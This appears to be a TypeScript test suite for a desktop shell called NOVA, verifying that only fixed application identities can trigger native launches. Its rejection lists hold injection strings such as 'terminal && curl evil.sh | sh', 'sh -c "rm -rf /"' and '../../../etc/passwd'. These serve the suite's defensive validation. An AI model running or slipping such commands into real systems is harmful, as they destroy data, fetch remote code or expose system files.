import type { NativeActionRequest, NativeActionResult } from '../../types/nativeAction';
import { isApplicationId, isNativeCapability } from '../../types/nativeAction';
import type { AppType } from '../../types/window';
import { APPS } from '../../data/apps';
import { useSpatialStore } from '../../state/spatialStore';
import { dispatch, subscribeToCommands } from '../command/commandBus';
import { translateIntent } from '../command/contextBridge';
import { routeUtterance } from '../command/intentRouter';
import * as engine from '../context/contextEngine';
import { normalizeProviderReport } from './nativeBridge';
import { useNativeStore } from './nativeStore';
import { requestNativeAction, useNativeActionStore } from './nativeActions';
import {
  BRIDGE_SYSTEM_ADAPTER,
  NO_SYSTEM_ADAPTER,
  getSystemAdapter,
  hasNativeCapability,
  setSystemAdapter,
} from './systemAdapter';

/**
 * Phase 9 verification.
 *
 * ── What is real and what is mocked ──────────────────────────────────────────
 * REAL: the capability vocabulary and its validation, the adapter, the command
 *       bus, the OPEN translation, and the separation between the spatial
 *       window and the native application.
 * MOCK: the *launcher*. `globalThis.fetch` is replaced so no application is
 *       started by a unit test. The real `gio launch` path is exercised
 *       separately against this Fedora machine and reported as a finding, not
 *       as an assertion that would pass anywhere.
 *
 * No unit test here claims a real application launched.
 */

let failures = 0;
let checks = 0;

function assert(condition: boolean, message: string) {
  checks += 1;
  if (!condition) {
    failures += 1;
    console.error(`  ✗ ${message}`);
  }
}

const pass = (message: string) => console.log(`✓ ${message}`);

console.log('\n=== NOVA Phase 9 · Controlled Native Application Launch ===\n');

// --- a mock launcher --------------------------------------------------------

interface Attempt {
  capability: unknown;
  applicationId: unknown;
}

const attempts: Attempt[] = [];
let reply: (body: Attempt) => unknown = () => ({ ok: true });
const realFetch = globalThis.fetch;

function installMockLauncher() {
  globalThis.fetch = (async (url: string, init?: RequestInit) => {
    if (!String(url).includes('/api/native/action')) {
      return new Response('{}', { status: 404 });
    }
    const body = JSON.parse(String(init?.body ?? '{}')) as Attempt;
    attempts.push(body);
    return new Response(JSON.stringify(reply(body)), {
      status: 200,
      headers: { 'Content-Type': 'application/json' },
    });
  }) as unknown as typeof fetch;
}

function restoreFetch() {
  globalThis.fetch = realFetch;
}

/** A host reading that makes the bridge adapter report itself Linux and capable. */
function linuxSnapshot() {
  return normalizeProviderReport(
    {
      providerId: 'linux',
      platform: 'linux',
      osName: 'Fedora Linux',
      osVersion: '44',
      desktopEnvironment: 'GNOME',
      sessionType: 'wayland',
      capabilities: {
        platformDetection: true,
        applicationEnumeration: true,
        runningProcessDetection: true,
        windowEnumeration: false,
        windowGeometry: false,
        workspaceEnumeration: false,
      },
      applications: [{ id: 'org.gnome.Ptyxis', name: 'Terminal', exec: 'ptyxis', running: false }],
      windows: [],
      notes: [],
    },
    1,
  );
}

const attachLinuxAdapter = () => {
  useNativeStore.getState().setSnapshot(linuxSnapshot());
  setSystemAdapter(BRIDGE_SYSTEM_ADAPTER);
};

// --- 6. capability validation ------------------------------------------------

console.log('--- Capability vocabulary ---');
{
  assert(isNativeCapability('OPEN_APPLICATION'), 'the one capability is recognised');
  for (const junk of [
    'EXECUTE', 'RUN_COMMAND', 'open_application', 'OPEN_APPLICATION ',
    'CLOSE_APPLICATION', 'FOCUS_WINDOW', '', null, undefined, 42, {},
  ]) {
    assert(!isNativeCapability(junk), `"${String(junk)}" is not a capability`);
  }
  pass('Only OPEN_APPLICATION is a capability; everything else is refused');
}

// --- 3, 4, 5. application id validation --------------------------------------

console.log('--- Application identity validation ---');
{
  for (const id of ['browser', 'code', 'files', 'notes', 'terminal']) {
    assert(isApplicationId(id), `"${id}" is a NOVA application`);
  }

  // §17.4, §17.5 — a path or a shell string is not a NOVA application, and
  // fails for the plain reason that it is not one of five fixed strings.
  const hostile = [
    '/bin/bash',
    '/usr/bin/ptyxis',
    'bash',
    'bash -c id',
    'sh -c "rm -rf /"',
    'terminal; rm -rf /',
    'terminal && curl evil.sh | sh',
    'terminal`id`',
    'terminal$(id)',
    '../../../etc/passwd',
    'org.gnome.Ptyxis',
    'terminal.desktop',
    'TERMINAL',
    'spotify',
    '',
    null,
    undefined,
    { toString: () => 'terminal' },
    ['terminal'],
  ];
  for (const id of hostile) {
    assert(!isApplicationId(id), `"${String(id)}" is rejected as an application id`);
  }
  pass('Paths, shell strings, desktop ids and unknown apps are all rejected');
}

// --- 1, 2. a valid request reaches the boundary ------------------------------

console.log('--- Valid requests ---');
{
  installMockLauncher();
  attachLinuxAdapter();
  attempts.length = 0;
  reply = () => ({ ok: true });

  const result = await requestNativeAction({
    capability: 'OPEN_APPLICATION',
    applicationId: 'terminal',
  });
  assert(result.ok === true, 'a valid terminal request succeeds');
  assert(attempts.length === 1, 'and reached the boundary exactly once');
  assert(attempts[0].capability === 'OPEN_APPLICATION', 'carrying the capability');
  assert(attempts[0].applicationId === 'terminal', 'and the stable NOVA identity');

  // §8 — the browser must never send an executable, path or desktop id.
  const sent = JSON.stringify(attempts[0]);
  assert(Object.keys(attempts[0]).length === 2, 'the request has exactly two fields');
  assert(!/\/usr|\/bin|\.desktop|ptyxis|exec|args|command|shell/i.test(sent), `no executable detail is sent: ${sent}`);

  for (const id of ['browser', 'code', 'files', 'notes'] as AppType[]) {
    attempts.length = 0;
    const other = await requestNativeAction({ capability: 'OPEN_APPLICATION', applicationId: id });
    assert(other.ok === true, `${id} is a valid request`);
    assert(attempts[0].applicationId === id, `and sends "${id}" unchanged`);
  }
  pass('A valid request carries a capability and an identity — nothing else');
}

// --- 6. invalid requests never reach the boundary ----------------------------

console.log('--- Invalid requests are refused locally ---');
{
  installMockLauncher();
  attempts.length = 0;

  const badCapability = await requestNativeAction({
    capability: 'RUN_COMMAND',
    applicationId: 'terminal',
  } as unknown as NativeActionRequest);
  assert(badCapability.ok === false, 'an unknown capability fails');
  assert(badCapability.reason === 'INVALID_CAPABILITY', 'with INVALID_CAPABILITY');

  const badApp = await requestNativeAction({
    capability: 'OPEN_APPLICATION',
    applicationId: '/bin/bash',
  } as unknown as NativeActionRequest);
  assert(badApp.ok === false, 'an executable path fails');
  assert(badApp.reason === 'INVALID_APPLICATION_ID', 'with INVALID_APPLICATION_ID');
  assert(badApp.applicationId === '', 'and the rejected string is not echoed back');

  const shellish = await requestNativeAction({
    capability: 'OPEN_APPLICATION',
    applicationId: 'terminal; rm -rf /',
  } as unknown as NativeActionRequest);
  assert(shellish.reason === 'INVALID_APPLICATION_ID', 'a shell string fails the same way');

  assert(
    attempts.length === 0,
    `nothing invalid reached the boundary at all, saw ${JSON.stringify(attempts)}`,
  );
  pass('Invalid requests are refused before any network call is made');
}

// --- 7, 8. structured failure and provider trouble ---------------------------

console.log('--- Structured failure ---');
{
  installMockLauncher();
  attachLinuxAdapter();

  reply = () => ({ ok: false, reason: 'APPLICATION_NOT_AVAILABLE', message: 'No approved notes application is installed.' });
  const unavailable = await requestNativeAction({ capability: 'OPEN_APPLICATION', applicationId: 'notes' });
  assert(unavailable.ok === false, 'an uninstalled application fails');
  assert(unavailable.reason === 'APPLICATION_NOT_AVAILABLE', 'with APPLICATION_NOT_AVAILABLE');
  assert(Boolean(unavailable.message), 'and something to show the user');

  reply = () => ({ ok: false, reason: 'LAUNCH_FAILED' });
  const failed = await requestNativeAction({ capability: 'OPEN_APPLICATION', applicationId: 'terminal' });
  assert(failed.reason === 'LAUNCH_FAILED', 'a failed launch is LAUNCH_FAILED');

  // A reason NOVA does not know must not be passed through as if understood.
  reply = () => ({ ok: false, reason: 'KERNEL_PANIC', message: 'x' });
  const unknownReason = await requestNativeAction({ capability: 'OPEN_APPLICATION', applicationId: 'terminal' });
  assert(unknownReason.reason === 'LAUNCH_FAILED', 'an unrecognised reason becomes the generic failure');

  // Malformed replies, and a provider that is simply not there.
  for (const junk of [null, 'a string', 42, []]) {
    reply = () => junk;
    const malformed = await requestNativeAction({ capability: 'OPEN_APPLICATION', applicationId: 'terminal' });
    assert(malformed.ok === false, `a ${JSON.stringify(junk)} reply fails safely`);
  }

  globalThis.fetch = (async () => {
    throw new Error('ECONNREFUSED /run/user/1000/…');
  }) as unknown as typeof fetch;
  const gone = await requestNativeAction({ capability: 'OPEN_APPLICATION', applicationId: 'terminal' });
  assert(gone.ok === false, 'an unreachable provider fails');
  assert(gone.reason === 'NATIVE_PROVIDER_UNAVAILABLE', 'with NATIVE_PROVIDER_UNAVAILABLE');
  assert(
    !/ECONNREFUSED|run\/user/.test(JSON.stringify(gone)),
    `and the raw system error never reaches the browser: ${JSON.stringify(gone)}`,
  );
  pass('Every failure is a category, and no OS error text is leaked');
  restoreFetch();
}

// --- capability gating -------------------------------------------------------

console.log('--- Capability gating ---');
{
  setSystemAdapter(NO_SYSTEM_ADAPTER);
  assert(getSystemAdapter().capabilities.length === 0, 'a read-only adapter can do nothing');
  assert(hasNativeCapability('OPEN_APPLICATION') === false, 'and reports the capability absent');

  const refused = await NO_SYSTEM_ADAPTER.perform({
    capability: 'OPEN_APPLICATION',
    applicationId: 'terminal',
  });
  assert(refused.ok === false, 'asking it to act fails');
  assert(refused.reason === 'NATIVE_PROVIDER_UNAVAILABLE', 'with NATIVE_PROVIDER_UNAVAILABLE');

  // A non-Linux host reports the capability unavailable rather than failing late.
  useNativeStore.getState().setSnapshot(
    normalizeProviderReport(
      { platform: 'darwin', capabilities: { platformDetection: true }, applications: [], windows: [], notes: [] },
      1,
    ),
  );
  setSystemAdapter(BRIDGE_SYSTEM_ADAPTER);
  assert(BRIDGE_SYSTEM_ADAPTER.capabilities.length === 0, 'a non-Linux host offers no launching');
  const wrongPlatform = await BRIDGE_SYSTEM_ADAPTER.perform({
    capability: 'OPEN_APPLICATION',
    applicationId: 'terminal',
  });
  assert(wrongPlatform.reason === 'CAPABILITY_UNAVAILABLE', 'and says CAPABILITY_UNAVAILABLE');

  attachLinuxAdapter();
  assert(hasNativeCapability('OPEN_APPLICATION'), 'a Linux host does offer it');
  pass('The capability is gated on what the host actually reports');
}

// --- 10, 11. OPEN semantics in the bridge ------------------------------------

console.log('--- OPEN semantics ---');
{
  setSystemAdapter(NO_SYSTEM_ADAPTER);
  const stop = engine.startContextEngine();
  dispatch({ action: 'workspace', target: 'development' }, 'system');

  // §17.10 — a known application that is NOT currently represented.
  useSpatialStore.getState().removeWindow('notes');
  engine.resetContextEngine();
  assert(engine.getWindowContext('notes') === null, 'Notes is genuinely absent');

  const opened = translateIntent(engine.getCurrentContext(), {
    status: 'ok',
    commands: [{ action: 'OPEN', target: 'notes' }],
  });
  assert(opened.commands.length > 0, 'OPEN on an absent application produces a command');
  assert(
    opened.commands[0].action === 'open' && opened.commands[0].target === 'notes',
    `and it is open(notes), got ${JSON.stringify(opened.commands[0])}`,
  );
  assert(opened.clarification === null, 'without asking a question');

  // An alias from the existing registry resolves the same way.
  const byAlias = translateIntent(engine.getCurrentContext(), {
    status: 'ok',
    commands: [{ action: 'OPEN', target: 'my notes' }],
  });
  assert(
    byAlias.commands[0]?.action === 'open' && byAlias.commands[0].target === 'notes',
    'an alias from APPS resolves to the same application',
  );

  // §17.11 — an unknown target keeps the existing unresolved behaviour.
  const unknown = translateIntent(engine.getCurrentContext(), {
    status: 'ok',
    commands: [{ action: 'OPEN', target: 'spotify' }],
  });
  assert(unknown.commands.length === 0, 'OPEN on an unknown application produces no command');
  assert(unknown.clarification === null, 'and no clarification');
  // Phase 9.5 reaches the catalog before giving up, so the wording changed; the
  // guarantee did not. Nothing is emitted, and the log says why.
  assert(
    unknown.log.some((line) => /not open|Skipped|No installed application/i.test(line)),
    `preserving the unresolved log, got ${JSON.stringify(unknown.log)}`,
  );

  // An application that IS represented keeps the old reveal behaviour exactly.
  const present = translateIntent(engine.getCurrentContext(), {
    status: 'ok',
    commands: [{ action: 'OPEN', target: 'code' }],
  });
  assert(
    present.commands.some((c) => c.action === 'restore') &&
      present.commands.some((c) => c.action === 'focus'),
    `an existing window is still restored and focused, got ${JSON.stringify(present.commands)}`,
  );
  assert(
    !present.commands.some((c) => c.action === 'open'),
    'and is NOT re-opened',
  );
  pass('OPEN opens what is absent, reveals what is present, and refuses what is unknown');
  stop();
}

// --- 9, 14. the spatial command still works, with and without native ---------

console.log('--- Spatial behaviour is unchanged ---');
{
  const stop = engine.startContextEngine();
  setSystemAdapter(NO_SYSTEM_ADAPTER);
  restoreFetch();

  // §17.9 — the existing spatial `open` with no native layer at all.
  useSpatialStore.getState().removeWindow('files');
  assert(useSpatialStore.getState().windows.files === undefined, 'Files is absent');
  dispatch({ action: 'open', target: 'files' }, 'command-line');
  assert(Boolean(useSpatialStore.getState().windows.files), 'open still creates the spatial window');
  assert(useSpatialStore.getState().focusedId === 'files', 'and focuses it');

  // §14 — a category opens NOVA's own surface and starts nothing on the host.
  //
  // This assertion used to read "and the native launch was still attempted
  // once". It was changed deliberately, not relaxed: `open terminal` names one
  // of NOVA's five spatial applications, and launching the host's terminal as
  // well put a real window on top of the spatial shell. Naming a product —
  // `open Ptyxis` — still launches, and is covered below and in
  // verifyBuiltinCommands.ts.
  //
  // The property this section originally protected, that a failing native layer
  // can never prevent a spatial window from opening, is now structural: there
  // is no native call left in this path to fail.
  installMockLauncher();
  attachLinuxAdapter();
  reply = () => ({ ok: false, reason: 'LAUNCH_FAILED' });
  attempts.length = 0;

  useSpatialStore.getState().removeWindow('terminal');
  dispatch({ action: 'open', target: 'terminal' }, 'command-line');
  assert(
    Boolean(useSpatialStore.getState().windows.terminal),
    'the spatial terminal opens with a failing launcher attached',
  );

  await new Promise((resolve) => setTimeout(resolve, 10));
  assert(attempts.length === 0, 'and no native launch was attempted for a category');

  // A product name, by contrast, still reaches the launcher with its own id.
  reply = () => ({ ok: true });
  attempts.length = 0;
  dispatch({ action: 'open-application', applicationId: 'org.gnome.Ptyxis', name: 'Terminal' }, 'command-line');
  await new Promise((resolve) => setTimeout(resolve, 10));
  assert(attempts.length === 1, 'naming a product does still launch it');
  assert(attempts[0].applicationId === 'org.gnome.Ptyxis', 'for the right application');

  // The bus is synchronous: a hanging provider cannot hold up spatial work.
  reply = () => new Promise(() => {}) as unknown as Record<string, unknown>;
  useSpatialStore.getState().removeWindow('browser');
  dispatch({ action: 'open', target: 'browser' }, 'command-line');
  assert(
    Boolean(useSpatialStore.getState().windows.browser),
    'a hanging native provider does not delay the spatial window',
  );
  pass('A category opens a surface; a product name launches, and neither can block the other');

  restoreFetch();
  setSystemAdapter(NO_SYSTEM_ADAPTER);
  stop();
}

// --- the command pipeline end to end ----------------------------------------

console.log('--- "Open Terminal" through the real pipeline ---');
{
  installMockLauncher();
  const stop = engine.startContextEngine();
  dispatch({ action: 'workspace', target: 'development' }, 'system');
  attachLinuxAdapter();
  reply = () => ({ ok: true });

  const seen: Array<{ action: string; source: string }> = [];
  const unsubscribe = subscribeToCommands(({ command, source }) =>
    seen.push({ action: command.action, source }),
  );

  useSpatialStore.getState().removeWindow('terminal');
  engine.resetContextEngine();
  attempts.length = 0;
  seen.length = 0;

  const routed = await routeUtterance('open terminal', 'voice');
  await new Promise((resolve) => setTimeout(resolve, 10));

  assert(routed.understood === true, '"open terminal" is understood');
  assert(
    seen.some((entry) => entry.action === 'open'),
    `an open command reached the bus, saw ${JSON.stringify(seen)}`,
  );
  assert(
    seen.find((entry) => entry.action === 'open')?.source === 'voice',
    'labelled with the modality that asked',
  );
  assert(Boolean(useSpatialStore.getState().windows.terminal), 'the spatial terminal exists');
  assert(attempts.length === 0, 'and nothing was launched on the host for a category');

  // The other half of the same pipeline: a product name, which does launch.
  // Dispatched directly so this assertion does not depend on what happens to be
  // installed on the machine running the suite.
  attempts.length = 0;
  dispatch(
    { action: 'open-application', applicationId: 'org.gnome.Ptyxis', name: 'Terminal' },
    'voice',
  );
  await new Promise((resolve) => setTimeout(resolve, 10));
  assert(attempts.length === 1, 'exactly one native launch was requested');
  assert(attempts[0].applicationId === 'org.gnome.Ptyxis', 'for the application named');
  pass('Voice → routeUtterance → NovaCommand → bus → spatial window, and separately → native launch');

  // §16 — the action trace records what was asked and what happened, no more.
  const [latest] = useNativeActionStore.getState().traces;
  assert(Boolean(latest), 'the action is traced');
  assert(latest.capability === 'OPEN_APPLICATION', 'with the capability');
  assert(latest.applicationId === 'org.gnome.Ptyxis', 'and the application');
  assert(typeof latest.ok === 'boolean', 'and the outcome');
  const traced = JSON.stringify(useNativeActionStore.getState().traces);
  assert(
    !/password|token|key|\/usr|\/bin|exec|audio|command/i.test(traced),
    `and nothing sensitive: ${traced}`,
  );
  assert(useNativeActionStore.getState().traces.length <= 8, 'the trace is bounded');
  pass('The action trace holds capability, application and outcome only');

  unsubscribe();
  stop();
  restoreFetch();
  setSystemAdapter(NO_SYSTEM_ADAPTER);
  useNativeActionStore.getState().clear();
}

// --- Phase 9.5A: discovered applications at the boundary --------------------

console.log('--- Discovered application identities ---');
{
  installMockLauncher();
  attachLinuxAdapter();
  attempts.length = 0;
  reply = () => ({ ok: true });

  // A desktop id is now a legitimate identity to send.
  const discovered = await requestNativeAction({
    capability: 'OPEN_APPLICATION',
    applicationId: 'com.spotify.Client',
  });
  assert(discovered.ok === true, 'a discovered application may be requested');
  assert(attempts.length === 1, 'and reaches the boundary');
  assert(attempts[0].applicationId === 'com.spotify.Client', 'as its desktop id');
  assert(
    Object.keys(attempts[0]).length === 2,
    'still exactly two fields — no path, no command, no argv',
  );

  // The five spatial types still work unchanged.
  attempts.length = 0;
  const spatial = await requestNativeAction({
    capability: 'OPEN_APPLICATION',
    applicationId: 'terminal',
  });
  assert(spatial.ok === true, 'a NOVA spatial type still works');
  assert(attempts[0].applicationId === 'terminal', 'sent unchanged');

  // Everything injection-shaped is still refused before the network.
  attempts.length = 0;
  for (const hostile of [
    '/bin/bash',
    'bash -c id',
    'id ',
    'spotify; rm -rf /',
    '../../etc/passwd',
    'com.spotify.Client; rm -rf /',
    'com.spotify.Client id',
    './relative',
    '',
  ]) {
    const refused = await requestNativeAction({
      capability: 'OPEN_APPLICATION',
      applicationId: hostile,
    } as unknown as NativeActionRequest);
    assert(refused.ok === false, `"${hostile}" is refused`);
    assert(refused.reason === 'INVALID_APPLICATION_ID', `with INVALID_APPLICATION_ID`);
  }
  assert(attempts.length === 0, `and none of them reached the boundary, saw ${JSON.stringify(attempts)}`);

  // NOTE: `id` alone is a *syntactically valid* desktop id shape. It is refused
  // by the server because no application with that id is installed — which is
  // the check that actually matters, and is exercised against the real machine
  // rather than mocked here.
  attempts.length = 0;
  reply = () => ({
    ok: false,
    reason: 'APPLICATION_NOT_AVAILABLE',
    message: 'No installed application matches "id".',
  });
  const notInstalled = await requestNativeAction({
    capability: 'OPEN_APPLICATION',
    applicationId: 'id',
  });
  assert(attempts.length === 1, 'a well-shaped id does reach the server');
  assert(notInstalled.ok === false, 'and the server refuses it');
  assert(
    notInstalled.reason === 'APPLICATION_NOT_AVAILABLE',
    'because it is not in the installed catalog — membership, not spelling',
  );
  pass('Desktop ids are accepted as identities; catalog membership decides, not shape');

  restoreFetch();
  setSystemAdapter(NO_SYSTEM_ADAPTER);
}

// --- the boundary ------------------------------------------------------------

console.log('--- Execution boundary ---');
{
  // Nothing in the request vocabulary can express a command.
  const request: NativeActionRequest = {
    capability: 'OPEN_APPLICATION',
    applicationId: 'terminal',
  };
  assert(Object.keys(request).length === 2, 'a request has exactly two fields');
  for (const forbidden of ['command', 'args', 'argv', 'exec', 'path', 'shell', 'env', 'cwd']) {
    assert(!(forbidden in request), `a request has no "${forbidden}"`);
  }

  // A result carries no handle on anything.
  const result: NativeActionResult = { ok: true, capability: 'OPEN_APPLICATION', applicationId: 'terminal' };
  for (const forbidden of ['pid', 'handle', 'process', 'window', 'stdout', 'stderr']) {
    assert(!(forbidden in result), `a result has no "${forbidden}"`);
  }

  // The five applications NOVA can open are exactly its five identities.
  const appTypes = Object.keys(APPS).sort().join(',');
  assert(appTypes === 'browser,code,files,notes,terminal', `AppType was not widened, got ${appTypes}`);
  pass('The vocabulary cannot express a command, a path, or a handle');
}

console.log('\n========================================');
if (failures) {
  throw new Error(`${failures} of ${checks} native action assertions FAILED`);
}
console.log(`ALL ${checks} NATIVE ACTION ASSERTIONS PASSED! 🎉`);
console.log('========================================');
